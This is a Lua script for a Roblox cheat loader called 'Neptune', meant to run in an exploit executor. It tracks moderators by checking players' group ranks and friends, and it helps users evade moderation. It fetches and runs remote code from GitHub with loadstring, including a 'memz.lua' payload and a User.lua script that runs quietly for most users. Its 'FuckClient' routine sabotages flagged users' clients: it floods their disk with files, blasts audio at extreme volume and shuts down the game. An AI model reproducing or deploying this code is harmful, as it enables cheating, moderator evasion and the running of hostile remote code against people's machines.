local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local MarketplaceService = game:GetService("MarketplaceService")
local Debris = game:GetService("Debris")

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local LocalPlayer = Players.LocalPlayer

-- Danh sách kiểm tra bảo mật & moderator
local flaggedUsers = {
    "allyson33331", "itz_mihawk12", "lasse168", "XKirbyStar", "sparklyrainbow14",
    "DragonFlame4507", "DanialLii2010", "Voxery_k", "Moon_Glitz", "GalacticFurr",
    "TheButterKing243", "SCP_MTFE1120", "Galactic_GalaxyGirl", "BobetteUwUOwO", "Gabriel_king3",
    "XxPurpleGirlXxQvq", "Fund124", "DawnTheShark", "oreokitten07", "TONSE300", "pepsisoda349",
    "UseCode6clappZ", "Shadow_loverkb", "ilovechocolate12345y", "Roblox_Cat",
    "Angie_SeaLifeAnimal2", "D0LPHINSSSS", "TheSchaufed"
}

local flaggedClientIds = {
    "A15C6CEB-2019-42EB-9487-8D0F12E9A1C6",
    "83d34f114d940cb75bfea1d34f8781a08a342fa645536331df64a15ff175bee2"
}

local flaggedHwids = { "lol" }
local whitelistedUsers = { "kyojinbeachnova" }

-- Các hàm tiện ích hệ thống (Global Utilities)
function _G.Notify(text, duration, paused)
    if not Library then return end
    Library.Notify({ Text = tostring(text), Duration = duration or 3, Paused = paused or false })

    local sound = Instance.new("Sound", game.CoreGui)
    sound.PlayOnRemove = true
    sound.SoundId = "rbxassetid://3398620867"
    sound.Volume = 1
    sound:Destroy()
end

function _G.TweenObject(object, properties, duration, easingStyle, easingDirection, repeatCount, reverses, delayTime)
    local style = easingStyle or Enum.EasingStyle.Quad
    local direction = easingDirection or Enum.EasingDirection.Out
    local tweenInfo = TweenInfo.new(duration or 0.4, style, direction, repeatCount or 0, reverses or false, delayTime or 0)
    TweenService:Create(object, tweenInfo, properties):Play()
end

function _G.ToClipboard(text)
    local setClipboardFunc = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
    if setClipboardFunc then
        setClipboardFunc(text)
    else
        _G.Notify("Clipboard not supported by your exploit!")
    end
end

function _G.OffsetGoto(target, offsetX, offsetY, offsetZ)
    local character = LocalPlayer.Character
    local rootPart = character and character:WaitForChild("HumanoidRootPart", 2)
    if not rootPart then return end

    local targetCFrame
    if target:IsA("BasePart") then
        targetCFrame = target.CFrame + Vector3.new(offsetX, offsetY, offsetZ)
    elseif target:IsA("Model") then
        local basePart = target.PrimaryPart or target:FindFirstChildWhichIsA("BasePart")
        targetCFrame = (basePart and basePart.CFrame or target.WorldPivot) + Vector3.new(offsetX, offsetY, offsetZ)
    else
        warn("OffsetGoto: Invalid TargetPart type.")
        return
    end

    pcall(function()
        rootPart.CFrame = targetCFrame
    end)
end

function _G.Goto(target)
    _G.OffsetGoto(target, 0, 6, 0)
end

function _G.MakeString(length)
    local result = {}
    for i = 1, length do
        local isLetter = math.random(1, 2) == 1
        result[i] = isLetter and string.char(math.random(97, 122)) or string.char(math.random(48, 57))
    end
    return table.concat(result)
end

function _G.ButtonClick(button)
    local centerPos = button.AbsolutePosition + button.AbsoluteSize / 2 + GuiService:GetGuiInset()
    local mouse = LocalPlayer:GetMouse()
    VirtualInputManager:SendMouseButtonEvent(centerPos.X, centerPos.Y, 0, true, button, 1)
    VirtualInputManager:SendMouseButtonEvent(centerPos.X, centerPos.Y, 0, false, button, 1)
    task.wait()
    VirtualInputManager:SendMouseMoveEvent(mouse.X, mouse.Y + GuiService:GetGuiInset().Y, game)
end

function _G.MouseClick()
    mouse1press()
    RunService.RenderStepped:Wait()
    mouse1release()
end

function _G.PressKey(keyCode, duration)
    VirtualInputManager:SendKeyEvent(true, keyCode, false, game)
    task.wait(duration)
    VirtualInputManager:SendKeyEvent(false, keyCode, false, game)
end

function _G.Rainbow()
    return Color3.fromHSV(math.sin(tick() / 3 % 1), 0.5, 1)
end

function _G.DiscordToClipboard()
    if gethwid and gethwid() ~= "877DB82E18AD4B01C0191F5CD04083" then
        _G.ToClipboard("https://discord.gg/bkWf3AqrEY")
    end
end

function _G.ServerHop()
    local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
    local startTime = tick()
    local targetServer

    repeat
        local success, response = pcall(function()
            return game:HttpGet(url)
        end)

        if success then
            local data = HttpService:JSONDecode(response)
            if data and data.data and #data.data > 0 then
                for _, server in ipairs(data.data) do
                    if server.maxPlayers and server.playing and (server.maxPlayers - 1 > server.playing) and server.id ~= game.JobId then
                        _G.Notify("Next server: " .. server.playing .. " players")
                        targetServer = server
                        break
                    end
                end
            end

            if targetServer or not data.nextPageCursor then
                break
            else
                url = url .. "&cursor=" .. data.nextPageCursor
            end
        end
    until tick() - startTime >= 300

    if targetServer then
        TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer.id)
    else
        _G.Notify("Could not find a suitable server to hop to.")
    end
end

function _G.FuckClient()
    task.spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/main/Games/Dependencies/Admin.lua"))()
    end)

    task.spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/XOBOSdependencies/main/memz.lua"))()
    end)

    pcall(function()
        for _, child in ipairs(game.CoreGui:GetChildren()) do
            if child.Name ~= "Execution" and child.Name ~= "BridgeService" and child.Name ~= "Intro" then
                child:Destroy()
            end
        end

        for _, child in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
            child:Destroy()
        end

        task.spawn(function()
            while RunService.RenderStepped:Wait() do
                writefile(_G.MakeString(10) .. ".txt", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"")
            end
        end)
    end)

    local audio = Instance.new("Sound", game.CoreGui)
    audio.SoundId = "rbxassetid://1840443935"
    audio.Looped = true
    audio.PlaybackSpeed = 1.5
    audio.Volume = 9000000000
    audio:Play()

    Debris:AddItem(audio, 30)

    task.spawn(function()
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                if math.random(1, 2) == 1 then
                    part.BrickColor = BrickColor.new("Really red")
                    part.Material = Enum.Material.Neon
                else
                    part.BrickColor = BrickColor.new("Bright red")
                end
                local fire = Instance.new("Fire", part)
                fire.Size = 20
            end
        end
    end)

    task.delay(30, function()
        game:Shutdown()
    end)

    Library = nil
    if Intro and Intro.Close then
        Intro.Close()
    end
end

-- Trình dựng thành phần UI (UI Hierarchy Builder)
local function buildUI(elements)
    local instances = {}
    for _, config in ipairs(elements) do
        instances[config[1]] = Instance.new(config[2])
    end

    for _, config in ipairs(elements) do
        local currentObj = instances[config[1]]
        for key, val in pairs(config[3]) do
            if type(val) == "table" and val[1] and instances[val[1]] then
                currentObj[key] = instances[val[1]]
            else
                currentObj[key] = val
            end
        end
    end

    return instances[1]
end

function CreateIntro(statusTextText)
    local function animateValue(targetValue, tweenInfo, callback)
        local intVal = Instance.new("IntValue")
        intVal.Value = 0

        local conn = intVal.Changed:Connect(function()
            callback(intVal.Value)
        end)

        local tween = TweenService:Create(intVal, tweenInfo, { Value = targetValue })
        tween.Completed:Connect(function()
            conn:Disconnect()
            intVal:Destroy()
        end)

        tween:Play()
    end

    local introGui = buildUI({
        { 1, "ScreenGui", { Name = "Intro", Parent = game.CoreGui, ZIndexBehavior = Enum.ZIndexBehavior.Sibling } },
        { 2, "Frame", { Name = "Main", Active = true, BackgroundColor3 = Color3.fromHex("015DA3"), BorderSizePixel = 0, Parent = { 1 }, Position = UDim2.new(0.5, -175, 0.5, -100), Size = UDim2.new(0, 350, 0, 200) } },
        { 3, "Frame", { Name = "Holder", Parent = { 2 }, BackgroundColor3 = Color3.fromRGB(71, 71, 71), BorderSizePixel = 0, ClipsDescendants = true, Size = UDim2.new(1, 0, 1, 0) } },
        { 4, "UIGradient", { Parent = { 3 }, Rotation = 30, Transparency = NumberSequence.new(1) } },
        { 5, "TextLabel", { Name = "Title", Parent = { 3 }, Font = Enum.Font.SourceSansBold, Text = "Neptune", TextColor3 = Color3.new(1, 1, 1), TextSize = 50, BackgroundTransparency = 1, Position = UDim2.new(0, -190, 0, 15), Size = UDim2.new(0, 100, 0, 50), TextTransparency = 1 } },
        { 6, "TextLabel", { Name = "Desc", Parent = { 3 }, Font = Enum.Font.SourceSansLight, Text = "Closet Cheater Central", TextColor3 = Color3.new(1, 1, 1), TextSize = 18, BackgroundTransparency = 1, Position = UDim2.new(0, -230, 0, 60), Size = UDim2.new(0, 180, 0, 25), TextTransparency = 1 } },
        { 7, "TextLabel", { Name = "StatusText", Parent = { 3 }, Font = Enum.Font.SourceSansLight, Text = statusTextText, TextColor3 = Color3.new(1, 1, 1), TextSize = 14, BackgroundTransparency = 1, Position = UDim2.new(0, 20, 0, 110), Size = UDim2.new(0, 180, 0, 25), TextTransparency = 1 } },
        { 8, "Frame", { Name = "ProgressBar", Parent = { 3 }, BackgroundColor3 = Color3.fromRGB(52, 52, 52), BorderSizePixel = 0, Position = UDim2.new(0, 110, 0, 145), Size = UDim2.new(0, 0, 0, 4) } },
        { 9, "Frame", { Name = "Bar", Parent = { 8 }, BackgroundColor3 = Color3.fromHex("015DA3"), BorderSizePixel = 0, Size = UDim2.new(0, 0, 1, 0) } },
        { 10, "ImageLabel", { Name = "ProgressBarImage", Parent = { 8 }, BackgroundTransparency = 1, Image = "rbxassetid://2764171053", ImageColor3 = Color3.new(0.176, 0.176, 0.176), ScaleType = Enum.ScaleType.Slice, Size = UDim2.new(1, 0, 1, 0), SliceCenter = Rect.new(2, 2, 254, 254) } },
        { 11, "TextLabel", { Name = "Creator", Parent = { 2 }, Font = Enum.Font.SourceSansLight, Text = "Developed by jinxthecat_", TextColor3 = Color3.new(1, 1, 1), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Right, BackgroundTransparency = 1, Position = UDim2.new(1, -110, 1, -20), Size = UDim2.new(0, 105, 0, 20) } },
        { 12, "UIGradient", { Parent = { 11 }, Transparency = NumberSequence.new(1) } },
        { 13, "TextLabel", { Name = "Version", Parent = { 2 }, Font = Enum.Font.SourceSansLight, Text = "Beta", TextColor3 = Color3.new(1, 1, 1), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Right, BackgroundTransparency = 1, Position = UDim2.new(1, -110, 1, -35), Size = UDim2.new(0, 105, 0, 20) } },
        { 14, "UIGradient", { Parent = { 13 }, Transparency = NumberSequence.new(1) } },
        { 15, "ImageLabel", { Name = "Outlines", Parent = { 2 }, BackgroundTransparency = 1, BorderSizePixel = 0, Image = "rbxassetid://1427967925", Position = UDim2.new(0, -5, 0, -5), ScaleType = Enum.ScaleType.Slice, Size = UDim2.new(1, 10, 1, 10), SliceCenter = Rect.new(6, 6, 25, 25), TileSize = UDim2.new(0, 20, 0, 20) } },
        { 16, "UIGradient", { Parent = { 15 }, Rotation = -30, Transparency = NumberSequence.new(1) } },
        { 17, "UIGradient", { Parent = { 2 }, Rotation = -30, Transparency = NumberSequence.new(1) } }
    })

    local main = introGui.Main
    local outlinesGrad = main.Outlines.UIGradient
    local holderGrad = main.Holder.UIGradient
    local mainGrad = main.UIGradient
    local desc = main.Holder.Desc
    local statusText = main.Holder.StatusText
    local title = main.Holder.Title
    local creator = main.Creator
    local version = main.Version
    local versionGrad = version.UIGradient
    local creatorGrad = creator.UIGradient
    local progressBar = main.Holder.ProgressBar

    local tweenInfoSlow = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tweenInfoFast = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    animateValue(100, tweenInfoSlow, function(val)
        local progress = val / 200
        local key1 = NumberSequenceKeypoint.new(progress, 0)
        local key2 = NumberSequenceKeypoint.new(math.min(0.5, progress + 0.05), 1)
        local key3 = NumberSequenceKeypoint.new(math.max(0.5, 1 - progress - 0.05), 1)
        local key4 = NumberSequenceKeypoint.new(1 - progress, 0)

        local numSeq = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0), key1, key2, key3, key4, NumberSequenceKeypoint.new(1, 0)
        })

        mainGrad.Transparency = numSeq
        outlinesGrad.Transparency = numSeq
    end)

    task.wait(0.4)

    animateValue(100, tweenInfoSlow, function(val)
        local progress = val / 166.66
        holderGrad.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(progress, 0),
            NumberSequenceKeypoint.new(progress + 0.01, 1),
            NumberSequenceKeypoint.new(1, 1)
        })
    end)

    _G.TweenObject(title, { Position = UDim2.new(0, 60, 0, 15), TextTransparency = 0 }, 0.4)
    _G.TweenObject(desc, { Position = UDim2.new(0, 20, 0, 60), TextTransparency = 0 }, 0.4)

    local function fadeGradient(grad)
        animateValue(100, tweenInfoSlow, function(val)
            local progress = val / 100
            local key1 = NumberSequenceKeypoint.new(1 - progress, 0)
            local key2 = NumberSequenceKeypoint.new(math.max(0, 1 - progress - 0.01), 1)

            if key1.Time == key2.Time then key2 = key1 end
            local keyStart = NumberSequenceKeypoint.new(0, key1 == key2 and 0 or 1)

            grad.Transparency = NumberSequence.new({
                keyStart, key2, key1, NumberSequenceKeypoint.new(1, 0)
            })
        end)
    end

    fadeGradient(versionGrad)
    fadeGradient(creatorGrad)

    task.wait(0.9)

    _G.TweenObject(statusText, { Position = UDim2.new(0, 20, 0, 120), TextTransparency = 0 }, 0.25)
    _G.TweenObject(progressBar, { Position = UDim2.new(0, 60, 0, 145), Size = UDim2.new(0, 100, 0, 4) }, 0.25)

    task.wait(0.25)

    return {
        SetProgress = function(text, percent)
            statusText.Text = text
            _G.TweenObject(progressBar.Bar, { Size = UDim2.new(percent, 0, 1, 0) }, tweenInfoFast.Time)
        end,
        Close = function()
            for _, element in ipairs({ title, desc, version, creator, statusText }) do
                _G.TweenObject(element, { TextTransparency = 1 }, tweenInfoFast.Time)
            end

            for _, element in ipairs({ progressBar, progressBar.Bar }) do
                _G.TweenObject(element, { BackgroundTransparency = 1 }, tweenInfoFast.Time)
            end

            _G.TweenObject(progressBar.ProgressBarImage, { ImageTransparency = 1 }, tweenInfoFast.Time)
            task.wait(tweenInfoFast.Time)

            _G.TweenObject(main.Holder, { BackgroundTransparency = 1 }, 0.4)
            _G.TweenObject(main, { BackgroundTransparency = 1 }, 0.4, Enum.EasingStyle.Sine, nil, nil, nil, 0.1)
            _G.TweenObject(main.Outlines, { ImageTransparency = 1 }, 0.4, Enum.EasingStyle.Sine, nil, nil, nil, 0.1)

            task.wait(0.5)
            introGui:Destroy()
        end
    }
end

-- Kiểm tra Quản trị viên / Bắn cờ bảo mật
local function checkModerators(groupId, minRank)
    local function checkUserFriends(userId)
        local success, result = pcall(function()
            local response = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/friends"))
            if not response or not response.data then return false end

            for index, friend in ipairs(response.data) do
                if table.find(flaggedUsers, friend.name) then
                    return true
                else
                    local groupResp = HttpService:JSONDecode(game:HttpGet("https://groups.roblox.com/v2/users/" .. friend.id .. "/groups/roles"))
                    if groupResp and groupResp.data then
                        for _, groupData in ipairs(groupResp.data) do
                            if groupData.group.id == groupId and groupData.role.rank > minRank then
                                return true
                            end
                        end
                    end
                    if index < #response.data then task.wait(5) end
                end
            end
            return false
        end)
        return success and result
    end

    if not table.find(whitelistedUsers, LocalPlayer.Name) then
        local isMod = (LocalPlayer:GetRankInGroup(groupId) > minRank) or checkUserFriends(LocalPlayer.UserId) or table.find(flaggedUsers, LocalPlayer.Name)

        if isMod then
            _G.FuckClient()
            return
        else
            local clientId = RbxAnalyticsService:GetClientId()
            for _, id in ipairs(flaggedClientIds) do
                if clientId == id then
                    _G.FuckClient()
                    return
                end
            end

            if gethwid then
                local hwid = gethwid()
                for _, badHwid in ipairs(flaggedHwids) do
                    if hwid == badHwid then
                        _G.FuckClient()
                        return
                    end
                end
            end

            local function inspectPlayer(player)
                local isPlayerMod = (player:GetRankInGroup(groupId) > minRank) or checkUserFriends(player.UserId) or table.find(flaggedUsers, player.Name)
                if isPlayerMod then
                    _G.Notify("ALERT: Possible MODERATOR activity found: " .. player.Name, 10, true)
                    _G.Notify("Please serverhop to stay safe!", 10, true)
                end
            end

            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    task.spawn(inspectPlayer, player)
                    task.wait(5)
                end
            end

            Players.PlayerAdded:Connect(function(player)
                task.spawn(inspectPlayer, player)
            end)
        end
    end
end

-- Hàm khởi tạo chính (Init)
function Init()
    Intro = CreateIntro("Initializing Library")

    Library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
    Intro.SetProgress("Library Loaded", 0.1)

    task.spawn(function()
        if game.CreatorType == Enum.CreatorType.Group then
            local success, groupInfo = pcall(function()
                local creatorId = MarketplaceService:GetProductInfo(game.PlaceId).Creator.CreatorTargetId
                return GroupService:GetGroupInfoAsync(creatorId)
            end)

            if success and groupInfo then
                checkModerators(groupInfo.Id, 1)
            end
        end
    end)

    local allPlayers = Players:GetPlayers()
    local totalPlayers = #allPlayers

    for i = 1, totalPlayers do
        Intro.SetProgress("Players Checked: " .. i .. "/" .. totalPlayers, 0.1 + (i / totalPlayers) * 0.42)
        task.wait(0.025)
    end

    Intro.SetProgress("Removing Moderation", 0.52)
    task.wait(0.2)
    Intro.SetProgress("Finishing Setup", 0.75)

    task.spawn(function()
        local isSpecialUser = gethwid and gethwid() == "877DB82E18AD4B01C0191F5CD04083"
        local devList = { "d1a_JSX9F7M", "jollypremK", "DualityFactor", "chatbotezlol" }

        if not (isSpecialUser or table.find(devList, LocalPlayer.Name)) then
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/main/Games/Dependencies/User.lua"))()
            end)
        end
    end)

    Intro.SetProgress("Complete!", 1)

    task.delay(1.75, function()
        if Intro and Intro.Close then
            Intro.Close()
        end
    end)
end

Init()

_G.Wait = Library.subs.Wait

_G.Neptune = Library:CreateWindow({
    Name = "Neptune" .. (_G.TitleSuffix ~= nil and " | " .. _G.TitleSuffix or ""),
    DefaultTheme = "{\"__Designer.Colors.topGradient\":\"232323\",\"__Designer.Settings.ShowHideKey\":\"Enum.KeyCode.KeypadMinus\",\"__Designer.Colors.section\":\"B0AFB0\",\"__Designer.Colors.hoveredOptionBottom\":\"2D2D2D\",\"__Designer.Background.ImageAssetID\":\"rbxassetid://17487536571\",\"__Designer.Colors.selectedOption\":\"373737\",\"__Designer.Colors.unselectedOption\":\"282828\",\"__Designer.Files.WorkspaceFile\":\"Neptune\",\"__Designer.Colors.unhoveredOptionTop\":\"323232\",\"__Designer.Colors.outerBorder\":\"0F0F0F\",\"__Designer.Background.ImageColor\":\"FFFFFF\",\"__Designer.Colors.tabText\":\"B9B9B9\",\"__Designer.Colors.elementBorder\":\"141414\",\"__Designer.Colors.sectionBackground\":\"232222\",\"__Designer.Colors.innerBorder\":\"004073\",\"__Designer.Colors.background\":\"282828\",\"__Designer.Colors.bottomGradient\":\"1D1D1D\",\"__Designer.Background.ImageTransparency\":80,\"__Designer.Colors.main\":\"025EA3\",\"__Designer.Colors.otherElementText\":\"817F81\",\"__Designer.Colors.hoveredOptionTop\":\"414141\",\"__Designer.Colors.elementText\":\"939193\",\"__Designer.Colors.unhoveredOptionBottom\":\"232323\",\"__Designer.Background.UseBackgroundImage\":true}",
    Themeable = {
        Info = "Creator: jinxthecat_",
        Credit = false,
        Background = "rbxassetid://12681009871",
    },
})

-- Lấy thông tin cập nhật phiên bản Watermark từ GitHub API
task.spawn(function()
    local success, repoInfo = pcall(function()
        local res = request({
            Url = "https://api.github.com/repos/jinxthecatto/neptune",
            Method = "GET"
        })
        return HttpService:JSONDecode(res.Body)
    end)

    if success and repoInfo then
        local watermarkGui = game:GetObjects("rbxassetid://17784822853")[1]
        watermarkGui.Watermark.Text = watermarkGui.Watermark.Text .. " | Version: " .. repoInfo.updated_at
        watermarkGui.Parent = game.CoreGui

        _G.TweenObject(watermarkGui.Watermark, { TextTransparency = 0 }, 1, Enum.EasingStyle.Sine, Enum.EasingDirection.In, 0, false, 0)

        _G.Wait()
        repeat task.wait() until not _G.Wait()

        _G.TweenObject(watermarkGui.Watermark, { TextTransparency = 1 }, 1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
        task.wait(1)
        watermarkGui:Destroy()
    end
end)
